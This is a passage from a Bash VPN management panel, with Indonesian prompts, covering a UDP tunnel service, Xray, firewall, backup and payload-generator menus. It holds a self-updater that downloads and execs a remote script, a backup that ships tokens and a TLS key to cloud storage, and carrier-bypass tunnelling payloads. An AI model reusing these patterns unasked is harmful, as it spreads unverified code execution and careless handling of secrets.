    cat > /etc/systemd/system/zivpn-udp.service << 'ZISVC'



[Unit]



Description=ZI VPN UDP Gateway 7400-7500



After=network.target



Wants=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 /usr/local/bin/zivpn-udp



Restart=always



RestartSec=3



LimitNOFILE=65535



StandardOutput=null



StandardError=null







[Install]



WantedBy=multi-user.target



ZISVC







    systemctl daemon-reload



    systemctl enable zivpn-udp 2>/dev/null



    systemctl restart zivpn-udp 2>/dev/null



    sleep 2







    if systemctl is-active --quiet zivpn-udp; then



        echo -e "  ${GREEN}✔ ZI VPN UDP aktif di port 7400-7500!${NC}"



    else



        echo -e "  ${RED}✘ ZI VPN UDP gagal start!${NC}"



        journalctl -u zivpn-udp -n 5 --no-pager 2>/dev/null



    fi







    # Buka port di UFW jika aktif



    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then



        ufw allow 7400:7500/udp >/dev/null 2>&1



        echo -e "  ${GREEN}✔ UFW: port 7400-7500/udp dibuka${NC}"



    fi







    echo ""



    echo -e "  ${WHITE}Konfigurasi ZI VPN di app:${NC}"



    local DOMAIN_NOW; DOMAIN_NOW=$(cat "$DOMAIN_FILE" 2>/dev/null | tr -d '\n\r' | xargs)



    local IP_NOW; IP_NOW=$(get_ip)



    echo -e "  ${CYAN}Host/SNI  :${NC} ${DOMAIN_NOW:-$IP_NOW}"



    echo -e "  ${CYAN}Port UDP  :${NC} 7400 - 7500"



    echo -e "  ${CYAN}Payload   :${NC} GET / HTTP/1.1[crlf]Host: ${DOMAIN_NOW:-$IP_NOW}[crlf][crlf]"



    echo -e "  ${CYAN}SSH User  :${NC} sesuai akun SSH"



    echo -e "  ${CYAN}SSH Pass  :${NC} sesuai akun SSH"



    echo -e "  ${CYAN}SSH Port  :${NC} 22"



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







manage_zivpn_udp() {



    while true; do



        clear



        local W; W=$(get_width)



        local is_active=0



        systemctl is-active --quiet zivpn-udp 2>/dev/null && is_active=1



        local status_txt; [ $is_active -eq 1 ] && status_txt="${GREEN}● RUNNING${NC}" || status_txt="${RED}○ STOPPED${NC}"







        _box_top $W



        _box_center $W "${YELLOW}${BOLD}ZI VPN UDP MANAGER${NC}"



        _box_divider $W



        _box_left $W "Status    : ${status_txt}"



        _box_left $W "Port      : ${CYAN}7400 - 7500 UDP${NC}"



        _box_left $W "Tunnel    : ${CYAN}UDP → SSH port 22${NC}"



        _box_divider $W



        _box_row $W "[1] Install / Reinstall" "[2] Start / Restart"



        _box_row $W "[3] Stop" "[4] Lihat Log"



        _box_row $W "[5] Uninstall" "[0] Kembali"



        _box_bottom $W



        echo ""



        read -rp "  Select: " c



        case $c in



            1) install_zivpn_udp ;;



            2)



                systemctl restart zivpn-udp 2>/dev/null



                systemctl is-active --quiet zivpn-udp \
                    && echo -e "  ${GREEN}✔ ZI VPN UDP started!${NC}" \
                    || echo -e "  ${RED}✘ Failed to start!${NC}"



                sleep 2 ;;



            3)



                systemctl stop zivpn-udp 2>/dev/null



                echo -e "  ${YELLOW}ZI VPN UDP stopped.${NC}"; sleep 2 ;;



            4)



                clear



                echo -e "  ${CYAN}=== ZI VPN UDP Log ===${NC}"



                journalctl -u zivpn-udp -n 30 --no-pager 2>/dev/null



                echo ""; read -rp "  Tekan Enter..." ;;



            5)



                read -rp "  Yakin hapus ZI VPN UDP? [y/N]: " confirm



                if [[ "$confirm" == "y" ]]; then



                    systemctl stop zivpn-udp 2>/dev/null



                    systemctl disable zivpn-udp 2>/dev/null



                    rm -f /etc/systemd/system/zivpn-udp.service \
                          /usr/local/bin/zivpn-udp



                    systemctl daemon-reload >/dev/null 2>&1



                    echo -e "  ${GREEN}✔ ZI VPN UDP dihapus.${NC}"



                    sleep 2



                fi ;;



            0) return ;;



        esac



    done



}















update_menu() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}🔄  UPDATE PANEL${NC}"



    _box_divider $W



    _box_left $W "Script    : ${WHITE}YouzinCrabz Tunnel${NC}"



    _box_left $W "Versi saat ini : ${GREEN}v${SCRIPT_VERSION}${NC}"



    _box_left $W "GitHub    : ${CYAN}${GITHUB_USER}/${GITHUB_REPO}${NC}"



    _box_bottom $W



    echo ""







    _box_top $W



    _box_center $W "${WHITE}Pilih metode update:${NC}"



    _box_divider $W



    _box_row $W "[1] Update dari GitHub" "[2] Update Web Page"



    _box_row $W "[3] Apply Auto-Start" "[0] Kembali"



    _box_bottom $W



    echo ""



    read -rp "  Pilih [0-3]: " uchoice







    case $uchoice in



    1)



        echo ""



        echo -e "  ${CYAN}◈${NC} Mengecek versi terbaru dari GitHub..."



        local latest



        latest=$(curl -s --max-time 15 "$VERSION_URL" 2>/dev/null | tr -d '[:space:]')







        if [[ -z "$latest" ]]; then



            echo -e "  ${RED}✘ Tidak bisa connect ke GitHub!${NC}"



            echo -e "  ${YELLOW}  Coba gunakan opsi [2] atau [3] untuk update lokal.${NC}"



            echo ""; read -rp "  Tekan Enter..."; return



        fi







        echo -e "  ${GREEN}✔${NC} Versi terbaru : ${YELLOW}v${latest}${NC}"



        echo ""







        if [[ "$latest" == "$SCRIPT_VERSION" ]]; then



            echo -e "  ${GREEN}✔ Script sudah versi terbaru!${NC}"



            echo ""; read -rp "  Tekan Enter..."; return



        fi







        echo -e "  ${YELLOW}⚡ Update tersedia: v${SCRIPT_VERSION} → v${latest}${NC}"



        echo ""



        read -rp "  Update sekarang? [y/N]: " confirm



        [[ "$confirm" != "y" ]] && return



        echo ""







        cp "$SCRIPT_PATH" "$BACKUP_PATH" 2>/dev/null \
            && echo -e "  ${GREEN}✔${NC} Backup → ${BACKUP_PATH}" \
            || echo -e "  ${YELLOW}⚠${NC} Backup gagal, lanjut..."







        local tmp="/tmp/tunnel_update_$$.sh"



        echo -e "  ${CYAN}◈${NC} Mengunduh dari GitHub..."



        if ! curl -L --max-time 90 --retry 3 --progress-bar "$SCRIPT_URL" -o "$tmp" 2>&1; then



            echo -e "  ${RED}✘ Download gagal!${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        if [[ ! -s "$tmp" ]]; then



            echo -e "  ${RED}✘ File download kosong!${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        if bash -n "$tmp" 2>/dev/null; then



            echo -e "  ${GREEN}✔${NC} Syntax OK"



        else



            echo -e "  ${RED}✘ Syntax error, rollback...${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        mv "$tmp" "$SCRIPT_PATH"



        chmod +x "$SCRIPT_PATH"



        deploy_web_page >/dev/null 2>&1



        echo -e "  ${GREEN}✔ Update berhasil! v${SCRIPT_VERSION} → v${latest}${NC}"



        echo -e "  ${CYAN}◈${NC} Restart panel dalam 3 detik..."



        sleep 3



        exec bash "$SCRIPT_PATH"



        ;;







    2)



        echo ""



        echo -e "  ${CYAN}◈${NC} Deploy ulang web page ke Nginx..."



        deploy_web_page



        echo -e "  ${GREEN}✔ Web page berhasil diperbarui!${NC}"



        echo -e "  ${CYAN}◈${NC} Buka browser: ${YELLOW}http://${DOMAIN:-$(get_ip)}/${NC}"



        echo ""; read -rp "  Tekan Enter..."



        ;;







    3)



        echo ""



        echo -e "  ${CYAN}◈${NC} Menerapkan auto-start menu saat login SSH..."



        setup_menu_command



        echo -e "  ${GREEN}✔ Auto-start aktif!${NC}"



        echo -e "  ${CYAN}◈${NC} Logout & login ulang untuk test."



        echo ""; read -rp "  Tekan Enter..."



        ;;







    0) return ;;



    *) echo -e "  ${RED}Pilihan tidak valid${NC}"; sleep 1 ;;



    esac



}







#================================================



# CHANGE TIMEZONE



#================================================







change_timezone() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}TIMEZONE SETTINGS${NC}"



    _box_divider $W



    echo -e "  ${WHITE}Timezone saat ini :${NC} ${CYAN}$(timedatectl show --property=Timezone --value 2>/dev/null || cat /etc/timezone)${NC}"



    echo -e "  ${WHITE}Waktu sistem      :${NC} ${GREEN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    _box_divider $W



    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7)"



    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) ${GREEN}← Banjarmasin${NC}"



    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9)"



    echo -e "  ${CYAN}[4]${NC} Lainnya (ketik manual)"



    echo -e "  ${RED}[0]${NC} Back"



    _box_bottom $W



    echo ""



    read -rp "  Pilih [0-4]: " tz_choice



    local tz_zone=""



    case $tz_choice in



        1) tz_zone="Asia/Jakarta" ;;



        2) tz_zone="Asia/Makassar" ;;



        3) tz_zone="Asia/Jayapura" ;;



        4) read -rp "  Masukkan timezone (contoh: Asia/Singapore): " tz_zone ;;



        0) return ;;



    esac



    [[ -z "$tz_zone" ]] && return



    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then



        hwclock --systohc 2>/dev/null || true



        echo -e "  ${GREEN}✔ Timezone berhasil diubah ke: ${tz_zone}${NC}"



        echo -e "  ${WHITE}Waktu sekarang: $(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    else



        echo -e "  ${RED}✘ Timezone tidak valid: ${tz_zone}${NC}"



    fi



    sleep 2



}







#================================================



# ADVANCED MENU



#================================================







menu_advanced() {



    while true; do



        clear



        local W; W=$(get_width)



        _box_top $W



        _box_center $W "${YELLOW}${BOLD}ADVANCED SETTINGS${NC}"



        _box_divider $W



        _box_row $W "[1]  Port Management" "[8]  Bandwidth Monitor"



        _box_row $W "[2]  Protocol Config" "[9]  User IP Limits"



        _box_row $W "[3]  Auto Backup" "[10] Custom Payload"



        _box_row $W "[4]  SSH Brute Protect" "[11] Cron Jobs"



        _box_row $W "[5]  Fail2Ban Setup" "[12] System Logs"



        _box_row $W "[6]  DDoS Protection" "[13] Timezone"



        _box_row $W "[7]  Firewall Rules" "[14] SSL Cert Info"



        _box_row $W "[15] IP Whitelist SSH" "[16] Monitor Quota"



        _box_divider $W



        _box_left $W "[0]  Back to Main Menu"



        _box_bottom $W



        echo ""



        read -rp "  Select [0-16]: " choice



        case $choice in



            1) _adv_port_management ;;  2) _adv_protocol_settings ;;



            3) _adv_auto_backup ;;      4) _adv_ssh_brute_protection ;;



            5) _adv_fail2ban ;;         6) _adv_ddos_protection ;;



            7) _adv_firewall ;;         8) _adv_bandwidth_monitor ;;



            9) _adv_user_limits ;;      10) _adv_custom_payload ;;



            11) _adv_cron_jobs ;;       12) _adv_system_logs ;;



            13) change_timezone ;;      14) _adv_ssl_info ;;



            15) _adv_ip_whitelist ;;    16) _adv_quota_monitor ;;



            0) return ;;



        esac



    done



}







_adv_port_management() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}PORT MANAGEMENT${NC}"



    _mini_divider $MW



    local ports



    ports=$(ss -tlnp 2>/dev/null | awk 'NR>1 && /LISTEN/ {



        split($4,a,":"); port=a[length(a)]



        match($6,/\"([^\"]+)\"/,m)



        printf "  %-8s %s\n", port, m[1]



    }' | sort -n | head -20)



    while IFS= read -r line; do



        _mini_left $MW "${GREEN}${line}${NC}"



    done <<< "$ports"



    _mini_divider $MW



    _mini_left $MW "${WHITE}Port aktif sistem VPN:${NC}"



    _mini_row $MW "443  → TLS Nginx SSL" "80   → HTTP no-TLS"



    _mini_row $MW "22   → SSH OpenSSH" "222  → SSH Dropbear"



    _mini_row $MW "8080 → VMess WS" "8081 → VLess WS"



    _mini_row $MW "8082 → Trojan WS" "8444 → VMess gRPC"



    _mini_row $MW "8445 → VLess gRPC" "8446 → Trojan gRPC"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_adv_protocol_settings() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}PROTOCOL SETTINGS${NC}"



    _mini_divider $MW



    if [[ -f "$XRAY_CONFIG" ]]; then



        local inbound_count; inbound_count=$(jq '.inbounds | length' "$XRAY_CONFIG" 2>/dev/null)



        _mini_left $MW "Total Inbounds : ${GREEN}${inbound_count:-0}${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "${CYAN}${line}${NC}"



        done < <(jq -r '.inbounds[] | "→ \(.tag)  port:\(.port)  \(.protocol)"' "$XRAY_CONFIG" 2>/dev/null)



    else



        _mini_left $MW "${RED}Config Xray tidak ditemukan!${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Restart Xray " "[2] Lihat Config "



    _mini_two $MW "[3] Test Config  " "[0] Back         "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



                systemctl restart xray 2>/dev/null || true && echo -e "  ${GREEN}✔ Xray Restarted!${NC}"



            else



                echo -e "  ${RED}✘ Config error!${NC}"



                xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/    /'



            fi; sleep 2 ;;



        2) clear; cat "$XRAY_CONFIG" 2>/dev/null; echo ""; read -rp "  Tekan Enter..." ;;



        3)



            echo -e "  ${CYAN}Testing Xray...${NC}"



            xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/  /'



            echo ""; nginx -t 2>&1 | sed 's/^/  /'



            echo ""; read -rp "  Tekan Enter..." ;;



    esac



}







_adv_auto_backup() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} AUTO BACKUP CONFIG${NC}"



    _mini_divider $MW



    local cron_status="TIDAK AKTIF"



    crontab -l 2>/dev/null | grep -q "vpn-backup" && cron_status="${GREEN}AKTIF (jam 02:00)${NC}"



    _mini_left $MW "Status     : ${cron_status}"



    _mini_left $MW "Jadwal     : Setiap hari jam 02:00"



    _mini_left $MW "Lokasi     : /root/backups/"



    _mini_divider $MW



    _mini_two $MW "[1] Enable Auto Backup " "[2] Disable           "



    _mini_two $MW "[3] Backup Sekarang    " "[0] Back              "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            mkdir -p /root/backups

            # Create vpn-backup-auto wrapper for cron
            cat > /usr/local/bin/vpn-backup-auto << 'BACKUPEOF'
#!/bin/bash
# Auto backup wrapper for cron
BACKUP_DIR="/root/backups"
BACKUP_DATE="$(date +%Y%m%d-%H%M%S)"
BACKUP_FILE="vpn-fullbackup-${BACKUP_DATE}.tar.gz"
TMP_DIR="/tmp/vpn-backup-${BACKUP_DATE}"

mkdir -p "$BACKUP_DIR" "$TMP_DIR"

# MySQL dump
# Detect MySQL auth
MYSQLDUMP_CMD="mysqldump"
if [[ -f /etc/mysql/debian.cnf ]]; then
    MYSQLDUMP_CMD="mysqldump --defaults-file=/etc/mysql/debian.cnf"
elif mysql -u root -e "SELECT 1" &>/dev/null; then
    MYSQLDUMP_CMD="mysqldump -u root"
fi
if command -v mysqldump &>/dev/null; then
    $MYSQLDUMP_CMD --single-transaction --routines --triggers --events ordervpn 2>/dev/null > "$TMP_DIR/ordervpn.sql"
fi

# Config files
for f in /root/domain /root/.domain_type /root/akun \
         /root/.bot_token /root/.chat_id /root/.payment_info \
         /etc/xray/xray.crt /etc/xray/xray.key \
         /usr/local/etc/xray/config.json; do
    [[ -f "$f" ]] && cp "$f" "$TMP_DIR/" 2>/dev/null
done

# Compress
tar -czf "$BACKUP_DIR/$BACKUP_FILE" -C "$TMP_DIR" . 2>/dev/null
rm -rf "$TMP_DIR"

# Upload to GDrive
if command -v rclone &>/dev/null && rclone listremotes 2>/dev/null | grep -q "gdrive:"; then
    rclone copy "$BACKUP_DIR/$BACKUP_FILE" "gdrive:/vpn-backups/" 2>/dev/null
    # Cleanup old GDrive backups
    rclone delete --min-age 7d --include "vpn-fullbackup-*.tar.gz" "gdrive:/vpn-backups/" 2>/dev/null || true
fi

# Cleanup old local backups
find "$BACKUP_DIR" -name "vpn-fullbackup-*.tar.gz" -mtime +7 -delete 2>/dev/null
BACKUPEOF
            chmod +x /usr/local/bin/vpn-backup-auto



            (crontab -l 2>/dev/null | grep -v "vpn-autobackup"



             echo "0 2 * * * /usr/local/bin/vpn-backup-auto 2>/dev/null") | crontab -



            echo -e "  ${GREEN}✔ Auto backup aktif jam 02:00!${NC}"; sleep 2 ;;



        2) crontab -l 2>/dev/null | grep -v "vpn-backup" | crontab -



           echo -e "  ${YELLOW}Auto backup dimatikan.${NC}"; sleep 2 ;;



        3) _menu_backup ;;



    esac



}







_adv_ssh_brute_protection() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} SSH BRUTE FORCE PROTECTION${NC}"



    _mini_divider $MW



    detect_firewall_backend



    _mini_left $MW "Firewall Backend : ${CYAN}${FW_BACKEND}${NC}"



    _mini_divider $MW



    _mini_two $MW "[1] Aktifkan Protection " "[2] Lihat Block List  "



    _mini_two $MW "[3] Reset Rules        " "[0] Back              "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if [[ "$FW_BACKEND" == "nftables" ]]; then



                command -v iptables-legacy >/dev/null 2>&1 && {



                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null



                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null



                } || nft add rule ip filter INPUT tcp dport 22 ct state new limit rate 5/minute accept 2>/dev/null || true



            else



                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null



                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null



            fi



            echo -e "  ${GREEN}✔ SSH Brute Protection AKTIF!${NC}"; sleep 3 ;;



        2) clear; iptables -L INPUT -n 2>/dev/null | grep "DROP\|REJECT" | head -20



           echo ""; read -rp "  Tekan Enter..." ;;



        3) iptables -F 2>/dev/null; echo -e "  ${GREEN}✔ Rules direset!${NC}"; sleep 2 ;;



    esac



}







_adv_fail2ban() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} FAIL2BAN SETUP${NC}"



    _mini_divider $MW



    if command -v fail2ban-client >/dev/null 2>&1; then



        _mini_left $MW "${GREEN}✔ Fail2ban terinstall${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(fail2ban-client status 2>/dev/null | head -10)



    else



        _mini_left $MW "${RED}Fail2ban belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install Fail2ban " "[0] Back            "



    fi



    _mini_bottom $MW



    echo ""



    if ! command -v fail2ban-client >/dev/null 2>&1; then



        read -rp "  Select: " c



        if [[ "$c" == "1" ]]; then



            apt-get install -y fail2ban >/dev/null 2>&1



            systemctl enable fail2ban >/dev/null 2>&1



            systemctl restart fail2ban >/dev/null 2>&1



            echo -e "  ${GREEN}✔ Fail2ban terinstall!${NC}"



        fi



    fi



    read -rp "  Tekan Enter untuk kembali..."



}







_adv_ddos_protection() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} DDOS PROTECTION${NC}"



    _mini_divider $MW



    detect_firewall_backend



    _mini_left $MW "Backend : ${CYAN}${FW_BACKEND}${NC}"



    _mini_divider $MW



    _mini_two $MW "[1] Aktifkan DDoS Filter " "[2] Lihat Statistik  "



    _mini_two $MW "[3] Reset Rules          " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            sysctl -w net.ipv4.tcp_syncookies=1 >/dev/null 2>&1



            local ipt="iptables"



            [[ "$FW_BACKEND" == "nftables" ]] && command -v iptables-legacy >/dev/null 2>&1 && ipt="iptables-legacy"



            $ipt -A INPUT -p tcp ! --syn -m state --state NEW -j DROP 2>/dev/null



            $ipt -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 80 -j REJECT 2>/dev/null



            echo -e "  ${GREEN}✔ DDoS Protection AKTIF!${NC}"; sleep 3 ;;



        2) clear; iptables -L -n -v 2>/dev/null | head -30; echo ""; read -rp "  Tekan Enter..." ;;



        3) iptables -F 2>/dev/null; echo -e "  ${YELLOW}Rules direset.${NC}"; sleep 2 ;;



    esac



}







_adv_firewall() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} FIREWALL RULES (UFW)${NC}"



    _mini_divider $MW



    if command -v ufw >/dev/null 2>&1; then



        local ufw_status; ufw_status=$(ufw status 2>/dev/null | head -1)



        _mini_left $MW "Status : ${CYAN}${ufw_status}${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(ufw status numbered 2>/dev/null | tail -n +4 | head -10)



        _mini_divider $MW



        _mini_two $MW "[1] Enable UFW  " "[2] Disable UFW "



        _mini_two $MW "[3] Allow Port  " "[0] Back        "



    else



        _mini_left $MW "${RED}UFW belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install UFW " "[0] Back        "



    fi



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if command -v ufw >/dev/null 2>&1; then



                ufw allow 22/tcp >/dev/null 2>&1; ufw allow 443/tcp >/dev/null 2>&1



                echo "y" | ufw enable >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW Enabled!${NC}"



            else



                apt-get install -y ufw >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW terinstall!${NC}"



            fi; sleep 2 ;;



        2) ufw disable >/dev/null 2>&1; echo -e "  ${YELLOW}UFW Disabled${NC}"; sleep 2 ;;



        3) read -rp "  Port (contoh: 8080): " port



           [[ -n "$port" ]] && ufw allow "$port" >/dev/null 2>&1 && echo -e "  ${GREEN}✔ Port $port dibuka!${NC}"



           sleep 2 ;;



    esac



}







_adv_bandwidth_monitor() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}BANDWIDTH MONITOR${NC}"



    _mini_divider $MW



    if command -v vnstat >/dev/null 2>&1; then



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(vnstat 2>/dev/null | head -20 || echo "  Belum ada data")



    else



        _mini_left $MW "${RED}vnstat belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install vnstat " "[0] Back          "



    fi



    _mini_bottom $MW



    echo ""



    if ! command -v vnstat >/dev/null 2>&1; then



        read -rp "  Select: " c



        if [[ "$c" == "1" ]]; then



            apt-get install -y vnstat >/dev/null 2>&1



            systemctl enable vnstat >/dev/null 2>&1; systemctl start vnstat >/dev/null 2>&1



            echo -e "  ${GREEN}✔ vnstat terinstall!${NC}"



        fi



    fi



    read -rp "  Tekan Enter untuk kembali..."



}







_adv_user_limits() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} USER IP LIMITS${NC}"



    _mini_divider $MW



    shopt -s nullglob



    local files=("$AKUN_DIR"/*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -gt 0 ]]; then



        _mini_left $MW "${WHITE}Akun         Proto      IP Limit${NC}"



        _mini_divider $MW



        for f in "${files[@]}"; do



            local fname proto uname limit



            fname=$(basename "$f" .txt)



            proto=${fname%%-*}; uname=${fname#*-}



            limit=$(grep "IPLIMIT" "$f" 2>/dev/null | cut -d= -f2)



            _mini_two $MW "${GREEN}${uname}${NC}" "${CYAN}${proto}${NC}  ${YELLOW}${limit:-N/A} IP${NC}"



        done



    else



        _mini_left $MW "${RED}Tidak ada akun aktif!${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Update limit akun " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    [[ "$c" == "1" ]] && {



        read -rp "  Nama akun (contoh: vmess-user1): " akun



        read -rp "  IP Limit baru: " newlimit



        if [[ -f "$AKUN_DIR/${akun}.txt" && "$newlimit" =~ ^[0-9]+$ ]]; then



            sed -i "s/IPLIMIT=.*/IPLIMIT=${newlimit}/" "$AKUN_DIR/${akun}.txt"



            echo -e "  ${GREEN}✔ Updated: ${newlimit} IP${NC}"



        else



            echo -e "  ${RED}✘ Tidak ditemukan!${NC}"



        fi



        sleep 2



    }



}







_adv_custom_payload() {



    local PAYLOAD_DIR="/root/payloads"



    mkdir -p "$PAYLOAD_DIR"



    while true; do



        clear



        local W; W=$(get_width); local MW=$(( W - 4 ))



        [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



        [[ -z "$DOMAIN" ]] && DOMAIN="(belum diset)"



        _mini_top $MW



        _mini_center $MW "${YELLOW}${BOLD}CUSTOM PAYLOAD GENERATOR${NC}"



        _mini_divider $MW



        _mini_left $MW "${DIM}Domain: ${CYAN}${DOMAIN}${NC}"



        _mini_divider $MW



        _mini_row $MW "[1]  WebSocket Payload" "[2]  CONNECT Payload"



        _mini_row $MW "[3]  HTTP Custom Format" "[4]  Custom Payload Baru"



        _mini_divider $MW



        _mini_row $MW "[5]  Lihat Payload Tersimpan" "[6]  Hapus Payload"



        _mini_divider $MW



        _mini_left $MW "[0]  Kembali"



        _mini_bottom $MW



        echo ""



        read -rp "  Pilih [0-6]: " pl_choice



        case $pl_choice in



            1) _gen_ws_payload "$PAYLOAD_DIR" ;;



            2) _gen_connect_payload "$PAYLOAD_DIR" ;;



            3) _gen_hc_format "$PAYLOAD_DIR" ;;



            4) _gen_custom_payload "$PAYLOAD_DIR" ;;



            5) _view_payloads "$PAYLOAD_DIR" ;;



            6) _delete_payload "$PAYLOAD_DIR" ;;



            0) return ;;



        esac



    done



}







_gen_ws_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset! Set domain dulu di menu utama.${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}WEBSOCKET PAYLOAD${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${CYAN}Pilih path WebSocket:${NC}"



    echo -e "  ${DIM}1. /vmess (VMess WS)${NC}"



    echo -e "  ${DIM}2. /vless (VLess WS)${NC}"



    echo -e "  ${DIM}3. /trojan (Trojan WS)${NC}"



    echo -e "  ${DIM}4. / (Root path)${NC}"



    echo -e "  ${DIM}5. Custom path${NC}"



    echo ""



    read -rp "  Pilih path [1-5]: " ws_path



    case $ws_path in



        1) WSPATH="/vmess" ;;



        2) WSPATH="/vless" ;;



        3) WSPATH="/trojan" ;;



        4) WSPATH="/" ;;



        5) read -rp "  Masukkan path (contoh: /custom): " WSPATH



           [[ -z "$WSPATH" ]] && { echo -e "  ${RED}✘ Path tidak boleh kosong!${NC}"; sleep 1; return; } ;;



        *) echo -e "  ${RED}✘ Pilihan tidak valid!${NC}"; sleep 1; return ;;



    esac



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="ws_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    cat > "$FILE" << PAYEOF



GET ${WSPATH} HTTP/1.1[crlf]Host: ${DOMAIN}[crlf]Upgrade: websocket[crlf]Connection: Upgrade[crlf][crlf]



PAYEOF



    echo ""



    echo -e "  ${GREEN}✔ WebSocket payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}PAYLOAD:${NC}"



    _mini_left $MW "${GREEN}GET ${WSPATH} HTTP/1.1[crlf]${NC}"



    _mini_left $MW "${GREEN}Host: ${DOMAIN}[crlf]${NC}"



    _mini_left $MW "${GREEN}Upgrade: websocket[crlf]${NC}"



    _mini_left $MW "${GREEN}Connection: Upgrade[crlf][crlf]${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_connect_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset!${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HTTP CONNECT PAYLOAD${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${CYAN}Pilih port tujuan:${NC}"



    echo -e "  ${DIM}1. 443 (HTTPS/WebSocket)${NC}"



    echo -e "  ${DIM}2. 80 (HTTP)${NC}"



    echo -e "  ${DIM}3. 8080 (VMess WS)${NC}"



    echo -e "  ${DIM}4. 8081 (VLess WS)${NC}"



